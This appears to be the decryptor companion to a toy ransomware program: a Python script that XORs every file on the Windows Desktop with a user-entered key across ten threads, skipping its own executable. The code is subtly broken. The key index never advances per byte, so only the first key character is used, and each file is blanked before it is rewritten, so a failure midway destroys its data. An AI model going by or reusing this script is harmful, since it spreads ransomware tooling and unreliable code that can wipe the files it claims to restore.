import os
import threading
import queue


# encryption info
encryption_level = 512 // 8  # 512 bits = 64 bytes
key_char_pool = 'abcdefghijklmnopqurstuvwxyzABCDEFGHIJKLMNOPQURSTUVWXYZ1234567890<>?/.,:{}[]|+='
key_char_pool_len = len(key_char_pool)

# grab file paths to decrypt
print('preparing the files...')
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f"{desktop_path}\\{f}")
print('successfully located all files.')


# store files in the queue for thread to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)



def decrypt(key):
    while True:
        file = q.get()
        print(f'decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
            # increment key_index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
            print(f'{file} decrypted successfully.')
        except:
            print(f'{file} failed to decrypt.')
        q.task_done()


key = input('Enter key to decrypt files : ')


# set threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('decryption complete.')
input()
